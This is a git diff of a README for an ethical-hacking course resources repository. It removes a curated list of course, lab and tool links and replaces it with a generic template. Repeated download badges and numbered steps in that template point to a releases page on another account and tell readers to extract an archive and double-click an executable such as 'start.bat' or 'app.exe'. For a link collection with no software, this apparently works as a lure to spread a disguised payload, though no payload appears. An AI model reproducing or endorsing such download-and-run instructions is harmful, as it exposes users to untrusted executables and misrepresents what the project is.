@@ -1,145 +1,81 @@
+# 🎓 Ethical-Hacking-Course-Resources - Your Guide to Cybersecurity Skills
 
-![Ethical Hacking Course Resources](https://github.com/user-attachments/assets/54ac602e-54df-4ac6-962f-de5d2f226e8b)
+[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/jinsolkr/Ethical-Hacking-Course-Resources/releases)
 
+## 📚 Overview
 
-# 🚀 Ethical Hacking Course Resources
->  ⚠️ Everything you need throughout the course – organized, practical, and easy to access. 
+Welcome to the Ethical-Hacking-Course-Resources repository. This collection includes valuable materials from UCYBERS's Ethical Hacking Course. You will find tools, codes, and other resources to support your journey in cybersecurity.
 
+## 🚀 Getting Started
 
-# 🌐 General Links 
+To begin, follow these simple steps to download and install the resources. This guide will help you easily set up everything you need.
 
--   **🏠 Main Website:** [**UCYBERS**](https://ucybers.com/) 
+## ⬇️ Download & Install
 
--   **🎓 Course Platform:** [Ethical Hacking Course](https://academy.ucybers.com/p/ethical-hacking-course)
+1. **Visit the Releases Page**  
+   Click the link below to access the releases for this project.  
+   [Download Resources Here](https://github.com/jinsolkr/Ethical-Hacking-Course-Resources/releases)
 
--   **💬 Discord Community:** [Join Our Server](https://discord.gg/yceYGPce6e)  
+2. **Choose the Right Version**  
+   On the releases page, you will see a list of available versions. Look for the latest version. It may be labeled as "Latest Release" or have the highest version number.
 
--   **❓ Course FAQ:**  [View on GitHub](https://github.com/Dark0x0x/Ethical-Hacking-Course-FAQ)
+3. **Download the Files**  
+   Click on the download link for the specific file type you need. Generally, you will find a `.zip` or `.tar.gz` file for easy extraction.
 
-# 🧠 Note-Taking & Productivity Tools
+4. **Extract the Files**  
+   After downloading, locate the file on your computer. Use a program like 7-Zip or WinRAR to extract the contents of the file to a folder.
 
- -  ![icons8-notion-24](https://github.com/user-attachments/assets/4ab5c66a-b09e-4e63-ad3f-8395782f771a)         [Notion](https://www.notion.com/)  – Powerful cloud notes & docs
+5. **Run the Software**  
+   Once extracted, navigate to the folder. Look for the main executable file (this may be named something like `start.bat`, `app.exe`, or similar). Double-click to run it.
 
- -  ![obsidian-icon (1)](https://github.com/user-attachments/assets/504271f0-b43b-4853-bd5d-307b8c08e9e3)  [Obsidian ](https://obsidian.md/) – Local Markdown-based knowledge base
+## 🛠️ Requirements
 
- - ![cherrytree-icon-2048x2026-337z5zen (1)](https://github.com/user-attachments/assets/a30225ad-073f-4ff6-ad7e-0c4899a5285e) 
- [CherryTree](https://www.giuspen.com/cherrytree/) – Linux tree-style note tool
+Before running the resources, ensure your system meets the following requirements:
 
- -  ![Greenshot_logo svg (1)](https://github.com/user-attachments/assets/c3212c18-b309-40cf-a326-7b6e4059b4b6)
-[GreenShot](https://getgreenshot.org/downloads/) – Lightweight screenshot utility
+- **Operating System**: Windows, macOS, or Linux. Ensure you have the latest updates for your system.
+- **Disk Space**: At least 500 MB of free space to accommodate all files.
+- **Internet Connection**: A stable connection may be needed for additional resource downloads or updates.
 
- -  ![flameshot svg (1)](https://github.com/user-attachments/assets/bfefcf67-2463-42a9-8fd4-5b6e93f065fe)
-[FlameShot](https://github.com/lupoDharkael/flameshot) – Annotated screenshot tool
+## ✨ Features
 
- -  ![icons8-microsoft-onenote-24](https://github.com/user-attachments/assets/3b19a05b-ba9a-4d5c-b237-f36e57ff8ad2)
-[OneNote](https://products.office.com/en-us/onenote/digital-note-taking-app?rtc=1) – Microsoft's note-taking app
+The Ethical-Hacking-Course-Resources include various tools and resources that cover:
 
- -   ![Joplin-icon svg (1)](https://github.com/user-attachments/assets/bda71a62-f3d6-453c-b70c-d48586ce84df)
-[Joplin](https://github.com/laurent22/joplin) – Open-source encrypted note
+- **Basic Hacking Techniques**: Understand the principles of ethical hacking.
+- **Advanced Software Tools**: Explore tools used in the industry, including penetration testing software.
+- **Coding Resources**: Access useful scripts and code libraries to enhance your learning.
+- **Hacking Methodologies**: Familiarize yourself with common frameworks and procedures in ethical hacking.
 
-# 🕸️ Networking Fundamentals
- -   ⚡ [7-Second Subnetting Trick (YouTube)](https://www.youtube.com/watch?v=ZxAwQB8TZsM)
+## 🔍 Topics Covered
 
- -   📊 [Subnetting Google Sheet](https://docs.google.com/spreadsheets/d/1sr6DiM3jhuj6uFvMfKK8zQfGSj9a42IA/edit?usp=sharing&ouid=112290104721208373103&rtpof=true&sd=true)
-# 💻 Lab Setup Essentials
- -  🐧 [Download Kali Linux VMs](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
-   
- -  📀 [Kali Linux ISO Archive](https://cdimage.kali.org/)
-   
- -  🖥️ [VMware Workstation Player](https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html)
+This repository includes resources related to the following topics:
 
- -  📦 [VirtualBox (Oracle)](https://www.virtualbox.org/wiki/Downloads)
+- course
+- cybersecurity
+- ethical-hacking
+- ethical-hacking-tools
+- hacking
+- hacking-code
+- hacking-course
+- hacking-resources
+- kali-linux
+- ucybers
 
-# 📘 Mid-Course Capstone
+## 💬 Community Support
 
--  💾 [Capstone Practice VMs (Google Drive)](https://drive.google.com/drive/folders/1w_xOhT-4RlCbMzoHdBsmXpqIGgUeVsEr?usp=drive_link)
+If you have questions or need help, feel free to check out the community discussions or open an issue in this repository. Engaging with others can enhance your learning experience.
 
--  🧠 [C Programming For Hacking course](https://academy.ucybers.com/p/c-programming-for-hacking)
+## 🚀 Additional Resources
 
--  🌐 [Network+ Course](https://academy.ucybers.com/p/network)
+- **Online Tutorials**: Visit websites dedicated to cybersecurity training.
+- **Books**: Look for recommended books in ethical hacking and cybersecurity.
+- **Forums**: Join forums and discussion groups related to ethical hacking to learn and share insights.
 
-# 🐞 Introduction to Exploit Development (Buffer Overflows)
+## 📄 License
 
-   -  🧪 [Immunity Debugger](https://www.immunityinc.com/products/debugger/
-)
-   -  🎯 [Vulnserver](http://www.thegreycorner.com/p/vulnserver.html)
+This project is licensed under the MIT License. You may use, modify, and distribute the resources as per the terms outlined in the LICENSE file in this repository.
 
-   -  🧬 [Identifying Bad Characters Guide](https://www.ins1gn1a.com/identifying-bad-characters/)
+## ⚡️ Conclusion
 
-# 🏢 Attacking Active Directory:
- - ## 🔓 Initial Access
+With the Ethical-Hacking-Course-Resources, you are well-equipped to start your journey in cybersecurity. Start downloading today and dive into the world of ethical hacking!
 
-      - 🍽️ [Top Five Ways I Got DA on Your Internal Network Before Lunch ](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
-
-      - 🌐 [mitm6 Overview](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
-
-      - 🔁 [NTLM Relay + Kerberos Delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
-
- - ## 🕵️ Post-Compromise Enumeration
-      - 📜 [PowerView Cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
-
- - ## 🗡️ Post-Compromise Attacks
-      - 🔐 [Group Policy Pwnage](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)
-
-      - 🪪 [Mimikatz (Credential Dumping)](https://github.com/gentilkiwi/mimikatz)
-
-      - 🌐 [ADSecurity Blog](https://adsecurity.org/) 
-
-      - ✍️ [Harmj0y Blog](http://blog.harmj0y.net/)
-
-      - 🧪 [AD Pentesting Lab (Pentester Academy)](https://www.pentesteracademy.com/activedirectorylab)
-
-      - 🛡️ [Red Team Lab (Pentester Academy)](https://www.pentesteracademy.com/redteamlab)
-
-      - 🎓 [PTX – eLearnSecurity](https://www.elearnsecurity.com/course/penetration_testing_extreme/)
-
-# 🌍 Web Application Testing
-- ## 🔍 Recon & Enumeration
-  - 🧰 [sumrecon](https://github.com/thatonetester/sumrecon)
-
-- ## 🔟 OWASP Top 10 Testing Resources
-  
-  - 📘 [OWASP Top 10 2017 PDF](https://owasp.org/www-pdf-archive/OWASP_Top_10-2017_%28en%29.pdf.pdf)
- 
-  - 📋 [OWASP Testing Checklist](https://github.com/tanprathan/OWASP-Testing-Checklist)
- 
-  - 📕 [OWASP Testing Guide (OTGv4)](https://owasp.org/www-pdf-archive/OTGv4.pdf)
- 
-  - 🐳 [Install Docker on Kali (Guide)](https://medium.com/@airman604/installing-docker-in-kali-linux-2017-1-fbaa4d1447fe)
- 
-  - 🍹 [Juice Shop Practice Lab](https://github.com/bkimminich/juice-shop) 
- 
-  - 🧩 [All OWASP Categories](https://owasp.org/www-project-top-ten/2017/) 
- 
-  - 🧠 [DOM XSS Deep Dive](https://www.scip.ch/en/?labs.20171214)
- 
-  - 🎮 [XSS Game](https://xss-game.appspot.com/)
- 
- # 📄 Reporting & Documentation
-  - 📝 [Sample Pentest Report (GitHub)](https://github.com/UCYBERS/UCYBERS-Sample-Pentest-Report)
-  
- # 🛠️ Tool Directory
- 
-  - 🔧 [setupkali Tool by UCYBERS](https://github.com/UCYBERS/setupkali)
-    
-  - 🔍 [Hunter.io](https://hunter.io/)
-    
-  - 🕵️ [theHarvester](https://github.com/laramies/theHarvester)
-
-  - 📂 [Breach Analyzer (UCYBERS)](https://github.com/UCYBERS/breach-analyzer)
-
-  - 🔐 [Hashcat (Password Cracking)](https://github.com/hashcat/hashcat) 
-
-  - 🪟 [Hashcat on Windows (Guide)](https://www.erobber.in/2017/04/hashcat-for-windows.html)
- 
-  - 🌐 [mitm6 Tool](https://github.com/fox-it/mitm6)
- 
-  - ⚠️ [mimikatz](https://github.com/gentilkiwi/mimikatz)
- 
-  - 🧰 [sumrecon](https://github.com/thatonetester/sumrecon) 
-
- # ☁️ Bonus: Free AD Lab on Azure
-  - 🏗️ [Step-by-Step Guide to Build Free AD Lab on Azure](https://medium.com/@kamran.bilgrami/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f)
-    
-
-> ⚠️ 💬 Questions? Feedback? Reach out via our Discord or through the course dashboard.
+[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/jinsolkr/Ethical-Hacking-Course-Resources/releases)
